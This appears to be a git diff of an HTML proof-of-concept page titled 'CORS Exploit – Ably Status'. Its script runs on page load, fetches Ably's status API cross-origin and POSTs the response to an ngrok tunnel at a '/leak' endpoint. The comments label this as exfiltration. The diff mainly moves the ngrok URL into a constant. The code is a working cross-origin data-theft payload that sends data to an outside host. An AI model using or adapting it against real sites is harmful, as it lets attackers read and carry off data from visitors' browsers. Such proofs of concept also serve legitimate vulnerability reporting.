@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>CORS Exploit – Ably Status</title>
   <style>
     body {
@@ -26,6 +26,8 @@
   <textarea id="output">Loading...</textarea>
 
   <script>
+    const NGROK_URL = "https://812c-152-58-177-169.ngrok-free.app";  // <-- Replace this with your current ngrok URL
+
     window.onload = () => {
       fetch("https://status.ably.com/api/v2/status.json", {
         method: "GET",
@@ -36,8 +38,8 @@
         alert("✅ Response received!");
         document.getElementById("output").value = data;
 
-        // 🔄 Exfiltrate the data to your ngrok server
-        fetch("https://7c1c-152-58-177-169.ngrok-free.app/leak", {
+        // Exfiltrate the data to your ngrok server
+        fetch(`${NGROK_URL}/leak`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ leaked: data })
